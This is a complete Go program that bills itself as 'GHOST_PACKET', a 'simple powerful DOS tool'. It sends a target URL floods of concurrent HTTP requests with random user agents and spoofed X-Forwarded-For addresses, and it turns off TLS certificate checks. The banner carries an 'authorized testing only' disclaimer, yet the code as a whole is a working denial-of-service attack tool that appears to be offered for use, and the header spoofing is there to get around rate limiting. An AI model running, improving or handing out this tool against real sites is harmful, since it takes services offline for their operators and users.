package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var (
	totalRequests   int64
	successfulHits  int64
	unreachableHits int64

	requestMethod    string
	requestBody      string
	supportedMethods []string

	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
	}
)

// -------------------- Utils --------------------

func getRandomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d",
		rand.Intn(255), rand.Intn(255),
		rand.Intn(255), rand.Intn(255))
}

func getRandomHeaders() map[string]string {
	ua := userAgents[rand.Intn(len(userAgents))]
	return map[string]string{
		"User-Agent":      ua,
		"Accept":          "*/*",
		"Connection":      "keep-alive",
		"X-Forwarded-For": getRandomIP(),
	}
}

// -------------------- HTTP Client --------------------

func newWorkerClient() *http.Client {
	return &http.Client{
		Transport: &http.Transport{
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			MaxConnsPerHost:     10,
			MaxIdleConns:        10,
			MaxIdleConnsPerHost: 10,
			DisableKeepAlives:   false,
		},
		Timeout: 5 * time.Second,
	}
}

// -------------------- Method Detection --------------------

func detectBestMethod(url string) (string, []string, error) {
	client := &http.Client{Timeout: 5 * time.Second}

	req, err := http.NewRequest("OPTIONS", url, nil)
	if err == nil {
		resp, err := client.Do(req)
		if err == nil && resp != nil {
			defer resp.Body.Close()
			allow := resp.Header.Get("Allow")
			if allow != "" {
				methods := strings.Split(allow, ",")
				for i := range methods {
					methods[i] = strings.TrimSpace(methods[i])
				}
				return chooseBestMethod(methods), methods, nil
			}
		}
	}

	for _, m := range []string{"HEAD", "GET", "POST"} {
		req, _ := http.NewRequest(m, url, nil)
		resp, err := client.Do(req)
		if err == nil && resp != nil {
			resp.Body.Close()
			return m, []string{m}, nil
		}
	}

	return "", nil, fmt.Errorf("no supported method detected")
}

func chooseBestMethod(methods []string) string {
	has := func(m string) bool {
		for _, v := range methods {
			if v == m {
				return true
			}
		}
		return false
	}
	switch {
	case has("POST"):
		return "POST"
	case has("GET"):
		return "GET"
	case has("HEAD"):
		return "HEAD"
	default:
		if len(methods) > 0 {
			return methods[0]
		}
		return "GET"
	}
}

// -------------------- Request --------------------

func sendRequest(client *http.Client, url string, method string, body string) {
	var req *http.Request
	var err error

	if method == "POST" || method == "PUT" || method == "PATCH" {
		req, err = http.NewRequest(method, url, strings.NewReader(body))
		if err == nil {
			req.Header.Set("Content-Type", "application/json")
		}
	} else {
		req, err = http.NewRequest(method, url, nil)
	}

	if err != nil {
		atomic.AddInt64(&unreachableHits, 1)
		fmt.Println("unreachable")
		return
	}

	for k, v := range getRandomHeaders() {
		req.Header.Set(k, v)
	}

	client.Timeout = 5 * time.Second
	resp, err := client.Do(req)
	if err != nil {
		atomic.AddInt64(&unreachableHits, 1)
		fmt.Println("unreachable")
		return
	}
	defer resp.Body.Close()

	io.Copy(io.Discard, resp.Body)

	atomic.AddInt64(&totalRequests, 1)
	if resp.StatusCode >= 200 && resp.StatusCode < 400 {
		atomic.AddInt64(&successfulHits, 1)
	}

	statusText := fmt.Sprintf("%d", resp.StatusCode)
	switch resp.StatusCode {
	case 100:
		statusText = "ℹ️ Continue"
	case 101:
		statusText = "🔄 Switching Protocols"
	case 200:
		statusText = "✅ OK"
	case 201:
		statusText = "🎉 Created"
	case 202:
		statusText = "⏳ Accepted"
	case 203:
		statusText = "ℹ️ Non-Authoritative Info"
	case 204:
		statusText = "🈳 No Content"
	case 205:
		statusText = "♻️ Reset Content"
	case 206:
		statusText = "📦 Partial Content"
	case 300:
		statusText = "🔀 Multiple Choices"
	case 301:
		statusText = "📍 Moved Permanently"
	case 302:
		statusText = "↩️ Found"
	case 303:
		statusText = "👀 See Other"
	case 304:
		statusText = "🗂️ Not Modified"
	case 307:
		statusText = "🔄 Temporary Redirect"
	case 308:
		statusText = "📌 Permanent Redirect"
	case 400:
		statusText = "❌ Bad Request"
	case 401:
		statusText = "🔒 Unauthorized"
	case 402:
		statusText = "💰 Payment Required"
	case 403:
		statusText = "⚠️ Forbidden"
	case 404:
		statusText = "🛑 Not Found"
	case 405:
		statusText = "🚫 Method Not Allowed"
	case 406:
		statusText = "❎ Not Acceptable"
	case 407:
		statusText = "🛡️ Proxy Auth Required"
	case 408:
		statusText = "⏱️ Request Timeout"
	case 409:
		statusText = "⚔️ Conflict"
	case 410:
		statusText = "🗑️ Gone"
	case 411:
		statusText = "📏 Length Required"
	case 412:
		statusText = "❗ Precondition Failed"
	case 413:
		statusText = "📦 Payload Too Large"
	case 414:
		statusText = "🔗 URI Too Long"
	case 415:
		statusText = "📄 Unsupported Media Type"
	case 416:
		statusText = "📛 Range Not Satisfiable"
	case 417:
		statusText = "🤷 Expectation Failed"
	case 418:
		statusText = "☕ I'm a Teapot"
	case 422:
		statusText = "❌ Unprocessable Entity"
	case 429:
		statusText = "🚨 Too Many Requests"
	case 500:
		statusText = "☠️ Server Error"
	case 501:
		statusText = "📭 Not Implemented"
	case 502:
		statusText = "💥 Bad Gateway"
	case 503:
		statusText = "🛑 Service Unavailable"
	case 504:
		statusText = "⏳ Gateway Timeout"
	case 505:
		statusText = "⚠️ HTTP Version Not Supported"
	case 506:
		statusText = "⚡ Variant Also Negotiates"
	case 507:
		statusText = "💾 Insufficient Storage"
	case 508:
		statusText = "🔥 Reach Limit"
	case 510:
		statusText = "🧩 Not Extended"
	case 511:
		statusText = "🔐 Network Auth Required"
	default:
		statusText = "❓ Unknown Status"
	}

	fmt.Printf("[%s] %s\n", statusText, url)
}

// -------------------- Load Test --------------------

func startLoadTest(url string, duration, workers, rps int) {
	fmt.Printf("\n🚀 Load test on %s | %ds | %d workers | %d RPS\n", url, duration, workers, rps)

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sig
		fmt.Println("\n🛑 Interrupt received, shutting down...")
		cancel()
	}()

	requestQueue := make(chan string, rps*workers)
	ticker := time.NewTicker(time.Second / time.Duration(rps))
	defer ticker.Stop()

	go func() {
		for {
			select {
			case <-ctx.Done():
				close(requestQueue)
				return
			case <-ticker.C:
				for i := 0; i < workers; i++ {
					select {
					case requestQueue <- url:
					default:
					}
				}
			}
		}
	}()

	var wg sync.WaitGroup
	wg.Add(workers)
	for i := 0; i < workers; i++ {
		go func() {
			defer wg.Done()
			client := newWorkerClient()
			for u := range requestQueue {
				var method string
				if requestMethod == "" && len(supportedMethods) > 0 {
					method = supportedMethods[rand.Intn(len(supportedMethods))]
				} else {
					method = requestMethod
				}
				sendRequest(client, u, method, requestBody)
			}
		}()
	}

	wg.Wait()
	fmt.Println("\n✅ Test completed honk honk honk")
	fmt.Printf("📊 Total: %d | Success: %d | Unreachable: %d\n", totalRequests, successfulHits, unreachableHits)
}

// -------------------- Helpers --------------------

func containsBodyMethod(methods []string) bool {
	for _, m := range methods {
		if m == "POST" || m == "PUT" || m == "PATCH" {
			return true
		}
	}
	return false
}

// -------------------- Main --------------------

func main() {
	rand.Seed(time.Now().UnixNano())
	reader := bufio.NewReader(os.Stdin)

	fmt.Println("===================================")
	fmt.Println("         GHOST_PACKET")
	fmt.Println("       SIMPLE POWERFUL DOS TOOL")
	fmt.Println("Author: Z4psT3r")
	fmt.Println("Organization: HonkSec")
	fmt.Println("Version: 1.0.0")
	fmt.Println("===================================")
	fmt.Println("WARNING & DISCLAIMER")
	fmt.Println("-----------------------------------")
	fmt.Println("This tool is intended for EDUCATIONAL")
	fmt.Println("and AUTHORIZED SECURITY TESTING only.")
	fmt.Println("")
	fmt.Println("Any misuse of this software against")
	fmt.Println("systems you do NOT own or have explicit")
	fmt.Println("permission to test is ILLEGAL.")
	fmt.Println("")
	fmt.Println("The author and organization assume NO")
	fmt.Println("liability for damage, data loss, or")
	fmt.Println("legal consequences resulting from use.")
	fmt.Println("")
	fmt.Println("By using this tool, you agree that")
	fmt.Println("YOU are solely responsible for your")
	fmt.Println("actions.")
	fmt.Println("===================================")

	fmt.Print("Target URL (https://example.com): ")
	targetURL, _ := reader.ReadString('\n')
	targetURL = strings.TrimSpace(targetURL)
	if targetURL == "" {
		fmt.Println("❌ Invalid URL")
		return
	}

	fmt.Print("HTTP method (leave blank to auto-detect or type GET/POST/etc): ")
	requestMethod, _ = reader.ReadString('\n')
	requestMethod = strings.ToUpper(strings.TrimSpace(requestMethod))

	if requestMethod == "" {
		fmt.Println("🔍 Detecting best HTTP method...")
		method, supported, err := detectBestMethod(targetURL)
		if err != nil {
			fmt.Println("❌ Method detection failed")
			return
		}
		supportedMethods = supported
		fmt.Printf("✅ Suggested method: %s\n", method)
		fmt.Printf("ℹ️ Supported: %s\n", strings.Join(supported, ", "))
	} else {
		supportedMethods = []string{requestMethod}
	}

	if requestMethod == "POST" || requestMethod == "PUT" || requestMethod == "PATCH" || containsBodyMethod(supportedMethods) {
		fmt.Print("JSON body (optional): ")
		requestBody, _ = reader.ReadString('\n')
		requestBody = strings.TrimSpace(requestBody)
	}

	fmt.Print("Duration (seconds): ")
	d, _ := reader.ReadString('\n')
	duration, _ := strconv.Atoi(strings.TrimSpace(d))

	fmt.Print("Workers: ")
	w, _ := reader.ReadString('\n')
	workers, _ := strconv.Atoi(strings.TrimSpace(w))

	fmt.Print("RPS limit: ")
	r, _ := reader.ReadString('\n')
	rps, _ := strconv.Atoi(strings.TrimSpace(r))

	startLoadTest(targetURL, duration, workers, rps)
}
